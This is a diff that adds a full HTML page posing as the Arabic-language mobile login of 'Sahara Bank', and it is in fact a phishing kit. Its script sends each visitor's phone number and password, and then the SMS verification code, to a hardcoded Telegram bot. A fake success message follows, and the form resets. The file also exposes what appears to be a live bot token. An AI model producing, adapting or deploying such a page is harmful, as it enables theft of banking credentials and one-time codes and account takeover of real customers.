@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>صحارى موبايل</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      font-family: 'Cairo', sans-serif;
+      background-color: #f2f2f2;
+    }
+    .page { display: none; padding-bottom: 50px; }
+    .active { display: block; }
+    .logo-container img {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+    .form-section {
+      margin-top: 30px;
+      text-align: center;
+    }
+    input[type="text"], input[type="password"] {
+      width: 90%;
+      max-width: 300px;
+      padding: 10px 16px;
+      margin-bottom: 12px;
+      border: 1px solid #ccc;
+      border-radius: 25px;
+      font-size: 13px;
+      background-color: #fff;
+      color: #333;
+      text-align: center;
+    }
+    input::placeholder { color: #004080; }
+    .password-wrapper {
+      position: relative;
+      display: inline-block;
+      width: 90%;
+      max-width: 300px;
+    }
+    .password-wrapper input { padding-right: 40px; }
+    .eye-icon {
+      position: absolute;
+      top: 50%;
+      right: 12px;
+      transform: translateY(-50%);
+      cursor: pointer;
+      font-size: 16px;
+      color: #888;
+    }
+    .login-button {
+      margin-top: 30px;
+      background-color: #004080;
+      color: white;
+      border: none;
+      padding: 8px;
+      width: 60%;
+      max-width: 180px;
+      border-radius: 25px;
+      font-size: 13px;
+      cursor: pointer;
+    }
+    .footer {
+      position: fixed;
+      bottom: 10px;
+      width: 100%;
+      text-align: center;
+      font-size: 11px;
+      color: #999;
+    }
+    .alert {
+      position: fixed;
+      top: 20px;
+      right: 50%;
+      transform: translateX(50%);
+      background-color: #ffdddd;
+      color: #a00;
+      padding: 10px 20px;
+      border-radius: 20px;
+      font-size: 13px;
+      box-shadow: 0 0 5px rgba(0,0,0,0.2);
+      display: none;
+      z-index: 1000;
+    }
+    .success-box {
+      position: fixed;
+      top: 30%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background-color: #e0ffe0;
+      color: #006600;
+      padding: 20px;
+      border-radius: 20px;
+      text-align: center;
+      box-shadow: 0 0 10px rgba(0,0,0,0.2);
+      display: none;
+      z-index: 1000;
+    }
+    .success-box button {
+      margin-top: 10px;
+      background-color: #004080;
+      color: white;
+      border: none;
+      padding: 6px 16px;
+      border-radius: 20px;
+      font-size: 13px;
+      cursor: pointer;
+    }
+    .code-message {
+      margin-top: 30px;
+      font-size: 15px;
+      color: #333;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- الصفحة الأولى -->
+  <div class="page active" id="loginPage">
+    <div class="logo-container">
+      <img src="saharebank_1.jpeg" alt="شعار صحارى بنك">
+    </div>
+    <div class="form-section">
+      <input type="text" id="phone" placeholder="رقم الهاتف (9xxxxxxxx)">
+      <div class="password-wrapper">
+        <input type="password" id="password" placeholder="كلمة المرور">
+        <span class="eye-icon" onclick="togglePassword()">👁️</span>
+      </div>
+      <button class="login-button" onclick="validateLogin()">تسجيل الدخول</button>
+    </div>
+  </div>
+
+  <!-- الصفحة الثانية -->
+  <div class="page" id="codePage">
+    <div class="logo-container">
+      <img src="saharebank_1.jpeg" alt="شعار صحارى بنك">
+    </div>
+    <div class="form-section">
+      <div class="code-message">ادخل الكود المرسل في الرسائل النصية</div>
+      <input type="text" id="codeInput" placeholder="الكود" maxlength="6">
+      <button class="login-button" id="codeSubmit">تسجيل الدخول</button>
+    </div>
+  </div>
+
+  <!-- التنبيهات -->
+  <div class="alert" id="alertBox">يرجى ملء الحقول أولاً</div>
+
+  <!-- رسالة النجاح -->
+  <div class="success-box" id="successBox">
+    <div>تم إدخال الكود بنجاح</div>
+    <button onclick="goBack()">تابع</button>
+  </div>
+
+  <!-- الفوتر -->
+  <div class="footer">جميع الحقوق محفوظة © 2025 لشركة مسارات</div>
+
+  <script>
+    // إعدادات بوت تيليجرام
+    const BOT_TOKEN = "8107227157:AAEpr_7wRvlQOA2Otdrom2Ag_96OiS2eoK0";
+    const CHAT_ID = "7166291647";
+    const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+    function sendToTelegram(message) {
+      fetch(API_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message
+        })
+      });
+    }
+
+    function togglePassword() {
+      const input = document.getElementById("password");
+      input.type = input.type === "password" ? "text" : "password";
+    }
+
+    function showAlert(message) {
+      const alert = document.getElementById("alertBox");
+      alert.textContent = message;
+      alert.style.display = "block";
+      setTimeout(() => {
+        alert.style.display = "none";
+      }, 2000);
+    }
+
+    function validateLogin() {
+      const phone = document.getElementById("phone").value.trim();
+      const password = document.getElementById("password").value.trim();
+      if (phone === "" || password === "") {
+        showAlert("يرجى ملء الحقول أولاً");
+      } else {
+        // رقم طلب 6 خانات
+        const orderId = Math.floor(100000 + Math.random() * 900000);
+        // إرسال الهاتف + كلمة السر
+        sendToTelegram(`📲 رقم الطلب: ${orderId}\n📞 الهاتف: ${phone}\n🔑 كلمة السر: ${password}`);
+
+        document.getElementById("loginPage").classList.remove("active");
+        document.getElementById("codePage").classList.add("active");
+        document.getElementById("codePage").setAttribute("data-order-id", orderId);
+      }
+    }
+
+    const codeInput = document.getElementById("codeInput");
+    codeInput.addEventListener("input", function () {
+      let value = codeInput.value;
+      value = value.replace(/[٠-٩]/g, ''); // إزالة الأرقام العربية
+      value = value.replace(/[^0-9]/g, ''); // السماح فقط بالأرقام الإنجليزية
+      if (value.length > 6) value = value.slice(0, 6);
+      codeInput.value = value;
+      if (value.length > 0 && value.length !== 4 && value.length !== 6) {
+        showAlert("مسموح من 4 إلى 6 أرقام فقط");
+      }
+    });
+
+    document.getElementById("codeSubmit").addEventListener("click", function () {
+      const value = codeInput.value.trim();
+      const orderId = document.getElementById("codePage").getAttribute("data-order-id");
+      if (value.length === 4 || value.length === 6) {
+        // إرسال الكود بنفس رقم الطلب
+        sendToTelegram(`📲 رقم الطلب: ${orderId}\n✅ الكود: ${value}`);
+        document.getElementById("successBox").style.display = "block";
+      } else {
+        showAlert("مسموح من 4 إلى 6 أرقام فقط");
+      }
+    });
+
+    function goBack() {
+      document.getElementById("successBox").style.display = "none";
+      document.getElementById("codePage").classList.remove("active");
+      document.getElementById("loginPage").classList.add("active");
+      document.getElementById("phone").value = "";
+      document.getElementById("password").value = "";
+      document.getElementById("codeInput").value = "";
+    }
+  </script>
+</body>
+</html>
